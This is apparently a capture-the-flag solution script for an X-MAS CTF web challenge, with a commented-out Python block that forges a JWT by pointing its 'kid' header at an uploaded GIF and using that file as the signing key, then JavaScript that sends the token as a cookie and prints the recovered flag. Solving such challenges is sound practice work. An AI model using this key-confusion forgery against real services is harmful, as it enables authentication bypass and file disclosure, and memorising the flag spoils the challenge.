/*
from types import resolve_bases
import jwt
import requests

url = "http://challs.xmas.htsp.ro:3010/getbanner.php"
with open('jwt.gif', 'rb') as fp:
    key = fp.read()

jwt_token = jwt.encode({'banner': 'flag.php'}, key, algorithm='HS256', headers={'kid': '/var/www/html/b/src/1608071199792.gif'})
*/

const url = "http://challs.xmas.htsp.ro:3010/getbanner.php";
const jwt_token = 'xxxxxxx'
const opts = {
    headers: {
        cookie: `banner=${jwt_token}`
    }
};

fetch(url, opts).then((x) => x.text()).then((x) => console.log(x));
// Output : X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}
